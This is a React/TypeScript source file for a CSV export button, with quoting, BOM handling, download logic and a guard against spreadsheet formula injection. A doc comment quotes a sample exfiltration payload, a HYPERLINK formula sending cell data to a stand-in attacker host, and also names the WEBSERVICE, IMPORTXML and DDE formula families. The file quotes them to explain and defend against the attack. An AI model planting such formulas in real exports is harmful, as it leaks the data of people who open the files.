"use client"

import * as React from "react"
import { Download, Loader2 } from "lucide-react"

import { cn } from "@/lib/utils"

/** One column of the exported file: what the header says, and how the cell is read from a row. */
export interface CsvColumn<Row> {
  /** Header text written in the first line. */
  header: string
  /** Computes the cell — a field, two of them joined, something nested, an id turned into a label. */
  value: (row: Row) => unknown
}

/**
 * What `columns` accepts.
 *
 * A bare property name is shorthand for reading that property under its own name, which is the
 * common case. Everything else — renaming a column, computing one, reordering them — is the object
 * form. There is deliberately no third spelling that names a property *and* a header: it would
 * overlap with both of these, and a column carrying a property name beside a function of its own
 * leaves a reader working out which of the two the file will actually hold.
 */
export type CsvColumnInput<Row> = (keyof Row & string) | CsvColumn<Row>

/** Expands the shorthand form into the pair the writer works with. */
function resolveColumn<Row>(column: CsvColumnInput<Row>): CsvColumn<Row> {
  return typeof column === "string"
    ? { header: column, value: (row) => (row as Record<string, unknown>)[column] }
    : column
}

/**
 * The columns to write, either as given or worked out from the rows.
 *
 * When no columns are declared, the keys are collected across **every** row rather than off the
 * first one. Rows that come back from an API are routinely sparse — a `deleted_at` that is only
 * present on the rows that have one — and reading the first row alone drops that column from the
 * file entirely for everybody. First-seen order is kept, so the common case still comes out in the
 * order the objects were built.
 */
export function resolveColumns<Row>(
  rows: readonly Row[],
  columns?: readonly CsvColumnInput<Row>[]
): CsvColumn<Row>[] {
  if (columns) return columns.map((column) => resolveColumn<Row>(column))
  const keys = new Set<string>()
  for (const row of rows) {
    if (row && typeof row === "object") for (const key of Object.keys(row)) keys.add(key)
  }
  return [...keys].map((key) => ({
    header: key,
    value: (row: Row) => (row as Record<string, unknown>)[key],
  }))
}

/**
 * Turns one cell value into the text that goes in the file.
 *
 * Dates become ISO 8601 on purpose, and it is the opposite call from a date being shown to someone:
 * a file is read later, elsewhere, by a person or a script whose locale nobody here knows, and
 * `03/04/2026` is two different days depending on which side of the Atlantic it is opened on. Note
 * that a spreadsheet treats an ISO instant as text rather than as a date value — if the column has
 * to arrive as a real date in Excel, format it yourself through `formatCell`.
 *
 * `NaN` and `Infinity` are written as empty rather than as the words, because a spreadsheet reading
 * "NaN" back gets a text cell in the middle of a numeric column, which breaks the column's total
 * without saying so. Objects and arrays are JSON — throwing on a circular structure rather than
 * writing something unparseable — and `null`/`undefined` are empty, which is what a blank cell is.
 */
export function formatCsvValue(value: unknown): string {
  if (value === null || value === undefined) return ""
  if (typeof value === "string") return value
  if (typeof value === "number") return Number.isFinite(value) ? String(value) : ""
  if (typeof value === "boolean" || typeof value === "bigint") return String(value)
  if (value instanceof Date) return Number.isNaN(value.getTime()) ? "" : value.toISOString()
  if (typeof value === "object") return JSON.stringify(value) ?? ""
  return String(value)
}

/**
 * The characters that make a spreadsheet treat a cell as a formula instead of as data.
 *
 * `=`, `+`, `-` and `@` are the four every spreadsheet evaluates; tab and carriage return are on
 * OWASP's list too, because both are stripped on the way in and leave the next character sitting at
 * the front of the cell.
 */
const FORMULA_START = /^[=+\-@\t\r]/

/** A string a spreadsheet would read as a plain number, and so must not be turned into text. */
const NUMERIC = /^[-+]?(\d+\.?\d*|\.\d+)([eE][-+]?\d+)?$/

/**
 * Defuses a cell that a spreadsheet would otherwise execute.
 *
 * This is the half of CSV writing that is a security bug rather than a formatting one. A cell whose
 * text starts with `=`, `+`, `-` or `@` is a formula to Excel, Sheets and LibreOffice, so a value
 * that came from a user — a display name, a note field, a support ticket subject — runs on the
 * machine of whoever opens the export. `=HYPERLINK("https://evil.example/?d="&A1,"Click")` quietly
 * ships the row next to it; the `WEBSERVICE`, `IMPORTXML` and `DDE` families have been used the
 * same way for years. It is filed as CSV injection, and it is the reason this component exists
 * rather than a `rows.map(r => r.join(","))` in the page.
 *
 * Quoting does not help. A spreadsheet strips the quotes while parsing and evaluates what is left,
 * so `"=1+1"` is still a formula — the field has to be changed, not wrapped. The fix OWASP gives is
 * a leading apostrophe, which is the text marker a spreadsheet already understands.
 *
 * The exception is the one a naive version gets wrong in the other direction: `-42` also starts
 * with a dangerous character, and prefixing it turns every negative number in the file into text,
 * so the column stops adding up. Anything that reads as a plain number is left exactly as it is.
 * `+44 20 7946 0000` is not a number, and is prefixed — which is correct twice over, since Excel
 * would otherwise show `#NAME?` where the phone number should be.
 */
export function sanitizeCsvCell(text: string): string {
  if (!FORMULA_START.test(text) || NUMERIC.test(text)) return text
  return `'${text}`
}

/**
 * Quotes one cell per RFC 4180: wrap it when it contains the delimiter, a quote or a line break,
 * and double any quote inside.
 *
 * The line-break case is the one hand-rolled writers forget. A textarea value with a newline in it
 * splits into two lines mid-record, and every row after it lands in the wrong column — a file that
 * opens fine and is wrong from row 400 down.
 */
export function escapeCsvCell(text: string, delimiter = ","): string {
  const needsQuotes =
    text.includes(delimiter) || text.includes('"') || text.includes("\n") || text.includes("\r")
  return needsQuotes ? `"${text.replace(/"/g, '""')}"` : text
}

export interface CsvOptions<Row> {
  /** Columns to write. Worked out from the rows when omitted. */
  columns?: readonly CsvColumnInput<Row>[]
  /** Field separator. `;` is what Excel expects in locales whose list separator is a semicolon. */
  delimiter?: string
  /** Whether to write the header line. */
  includeHeader?: boolean
  /** Guard against formula injection. Only turn it off for a file no spreadsheet will open. */
  sanitize?: boolean
  /** Replaces the default value-to-text conversion. */
  formatCell?: (value: unknown) => string
}

/**
 * Writes the rows as CSV text.
 *
 * Records are joined with CRLF, which is what RFC 4180 specifies and what every parser accepts;
 * that is not an option here, because making it one is how the file ends up with the LF endings
 * that some Windows tooling renders as a single line.
 *
 * The returned string carries no byte-order mark — see {@link downloadCsvFile}, which adds it to
 * the file. A BOM belongs to the bytes, not to the text: leaving it in the string would put an
 * invisible U+FEFF at the front of the first header of anything that goes on to POST this to an API
 * or hash it, where it breaks a comparison nobody can see.
 */
export function toCsv<Row>(rows: readonly Row[], options: CsvOptions<Row> = {}): string {
  const {
    columns,
    delimiter = ",",
    includeHeader = true,
    sanitize = true,
    formatCell = formatCsvValue,
  } = options
  const resolved = resolveColumns(rows, columns)
  const cell = (value: unknown) => {
    const text = formatCell(value)
    return escapeCsvCell(sanitize ? sanitizeCsvCell(text) : text, delimiter)
  }

  const lines: string[] = []
  // Headers go through the same pipeline as the data. They are cells too, and a column named by a
  // user — a spreadsheet import that kept its original column names, a custom field — can carry the
  // same payload as any other value.
  if (includeHeader) lines.push(resolved.map((column) => cell(column.header)).join(delimiter))
  for (const row of rows) {
    lines.push(resolved.map((column) => cell(column.value(row))).join(delimiter))
  }
  return lines.join("\r\n")
}

/** The UTF-8 byte-order mark, spelled as an escape because the character itself is invisible. */
const BOM = "\uFEFF"

/** Firefox needs the object URL to outlive the click's own task before it is released. */
const REVOKE_DELAY_MS = 40

/** Gives the file a `.csv` extension when the caller did not supply an extension of their own. */
export function withCsvExtension(filename: string): string {
  return /\.[a-z0-9]+$/i.test(filename) ? filename : `${filename}.csv`
}

export interface CsvDownloadOptions {
  /**
   * Write a UTF-8 byte-order mark. On by default, and it should stay on for any file a person will
   * open: Excel does not detect UTF-8 in a CSV, it falls back to the machine's legacy code page, so
   * without the BOM every non-ASCII character — accents, umlauts, Japanese, emoji, the £ sign —
   * arrives as mojibake. Turn it off for a file being parsed by a program, where the extra bytes
   * show up glued to the first header.
   */
  bom?: boolean
}

/**
 * Hands `csv` to the browser as a downloaded file.
 *
 * The two things a four-line version leaves out are both here. The anchor is put into the document
 * before it is clicked, because Firefox ignores a click on an element that is not in the tree. And
 * the object URL is revoked afterwards — an un-revoked one pins its blob, which is to say the whole
 * exported table, in memory for the life of the document, and a page whose export button gets
 * pressed a few times is holding every copy. Revoking is deferred rather than immediate, because
 * releasing the URL in the same task as the click cancels the download it was created for.
 */
export function downloadCsvFile(
  filename: string,
  csv: string,
  { bom = true }: CsvDownloadOptions = {}
): void {
  const parts = bom ? [BOM, csv] : [csv]
  const url = URL.createObjectURL(new Blob(parts, { type: "text/csv;charset=utf-8" }))
  const anchor = document.createElement("a")
  anchor.href = url
  anchor.download = withCsvExtension(filename)
  anchor.rel = "noopener"
  anchor.style.display = "none"
  document.body.appendChild(anchor)
  anchor.click()
  anchor.remove()
  window.setTimeout(() => URL.revokeObjectURL(url), REVOKE_DELAY_MS)
}

/** How long an announcement stays in the live region before it is cleared. */
const ANNOUNCE_MS = 5000

export interface CsvExportButtonProps<Row>
  extends Omit<React.ComponentPropsWithoutRef<"button">, "onError"> {
  /**
   * The rows to export, or a function that produces them.
   *
   * Pass a function when the file should hold more than the page is holding — it may return a
   * promise, and the button shows a spinner and blocks a second press until it settles. See
   * {@link CsvExportButton} for why that is usually the right shape.
   */
  rows: readonly Row[] | (() => readonly Row[] | Promise<readonly Row[]>)
  /** Columns to write, in file order. Worked out from the rows when omitted. */
  columns?: readonly CsvColumnInput<Row>[]
  /** Name of the saved file. `.csv` is appended when there is no extension. */
  filename?: string
  /** Delimiter, header line, sanitising and cell formatting. */
  options?: Omit<CsvOptions<Row>, "columns">
  /** Write a UTF-8 BOM so Excel reads the file as UTF-8. */
  bom?: boolean
  /** Fired once the file has been handed to the browser. */
  onExport?: (info: { rowCount: number; filename: string }) => void
  /** Fired when producing the rows or writing the file threw. The button returns to rest. */
  onError?: (error: unknown) => void
}

type ExportStatus = "idle" | "busy"

/**
 * A button that turns rows into a CSV file the browser saves.
 *
 * Reach for it wherever a table, list or report has to leave the app: an admin table's "Export",
 * a billing or transactions history, an analytics or report screen, a contacts, subscribers or
 * leads list, an audit log, a survey's responses, a GDPR data request. It is the mirror of
 * pulld file-dropzone and upload-list, which take a file in.
 *
 * Two things separate this from the inline version everyone writes. The first is that the inline
 * version is a security bug: user-supplied text starting with `=`, `+`, `-` or `@` is executed by
 * the spreadsheet that opens the file — see {@link sanitizeCsvCell} — and quoting does not stop it.
 * The second is quieter. The inline version exports the array the page happens to be holding, which
 * on any paginated screen is one page of it, so "Export all" silently writes 50 of 12,000 rows and
 * looks like it worked. That is why `rows` also takes a function: return the full set from it, or
 * a promise for a fetch of it, and the button handles the waiting.
 *
 * While that promise is outstanding the button is disabled and `aria-busy`, so a second press
 * cannot start a second export — the double-click that otherwise downloads the same file twice, or
 * fires the same expensive query twice. Nothing is downloaded if the rows arrive empty and there
 * are no declared columns, since a file with neither headers nor rows is a zero-byte download that
 * reads as a broken button; the reason is announced instead. With columns declared, the header-only
 * file is written, because that is a real answer to "there were no results".
 *
 * Every state change is announced through a polite live region rather than through the icon, since
 * an icon swap is not an event and reaches nobody using a screen reader. The announcement is
 * cleared a few seconds later so that exporting twice in a row is announced twice — a live region
 * whose text is re-set to the string it already holds says nothing.
 */
export function CsvExportButton<Row>({
  rows,
  columns,
  filename = "export.csv",
  options,
  bom = true,
  onExport,
  onError,
  onClick,
  children,
  disabled,
  className,
  ...props
}: CsvExportButtonProps<Row>) {
  const [status, setStatus] = React.useState<ExportStatus>("idle")
  const [message, setMessage] = React.useState("")
  const alive = React.useRef(true)

  React.useEffect(() => {
    alive.current = true
    return () => {
      alive.current = false
    }
  }, [])

  React.useEffect(() => {
    if (!message) return
    const id = window.setTimeout(() => setMessage(""), ANNOUNCE_MS)
    return () => window.clearTimeout(id)
  }, [message])

  const busy = status === "busy"

  async function handleClick(event: React.MouseEvent<HTMLButtonElement>) {
    // The caller's own onClick is invoked here rather than being left to the spread below. Props are
    // spread after this handler is attached, so an onClick coming in through them would replace the
    // export instead of running beside it — a button that still looks and sounds right and exports
    // nothing.
    onClick?.(event)
    if (event.defaultPrevented || busy) return

    setStatus("busy")
    setMessage("Preparing export")
    try {
      const resolvedRows = typeof rows === "function" ? await rows() : rows
      if (!alive.current) return
      if (resolvedRows.length === 0 && !columns) {
        setStatus("idle")
        setMessage("Nothing to export")
        return
      }
      const name = withCsvExtension(filename)
      downloadCsvFile(name, toCsv(resolvedRows, { ...options, columns }), { bom })
      setStatus("idle")
      setMessage(
        `Downloaded ${resolvedRows.length} row${resolvedRows.length === 1 ? "" : "s"} as ${name}`
      )
      onExport?.({ rowCount: resolvedRows.length, filename: name })
    } catch (error) {
      if (!alive.current) return
      setStatus("idle")
      setMessage("Export failed")
      onError?.(error)
    }
  }

  return (
    <>
      <button
        type="button"
        onClick={handleClick}
        disabled={disabled || busy}
        aria-busy={busy}
        className={cn(
          "inline-flex h-9 items-center justify-center gap-2 rounded-md border border-input bg-transparent px-3 text-sm font-medium text-foreground transition-colors hover:bg-accent hover:text-accent-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring disabled:pointer-events-none disabled:opacity-50",
          className
        )}
        {...props}
      >
        {busy ? (
          <Loader2 className="h-4 w-4 shrink-0 animate-spin" aria-hidden="true" />
        ) : (
          <Download className="h-4 w-4 shrink-0" aria-hidden="true" />
        )}
        {children ?? "Export CSV"}
      </button>
      {/* The live region is a sibling rather than a child, which is the difference between a button
          that announces its result and a button whose name keeps changing. A button takes its
          accessible name from its contents, visually hidden ones included, so a region inside it
          would have this read as "Export CSV, Downloaded 2 rows as export.csv" for as long as the
          announcement lasted. (An icon-only button like pulld copy-button can hold its own region,
          because its name comes from an explicit aria-label that wins over the contents.) It is
          absolutely positioned by sr-only, so it takes part in no layout it is dropped into. */}
      <span aria-live="polite" className="sr-only">
        {message}
      </span>
    </>
  )
}
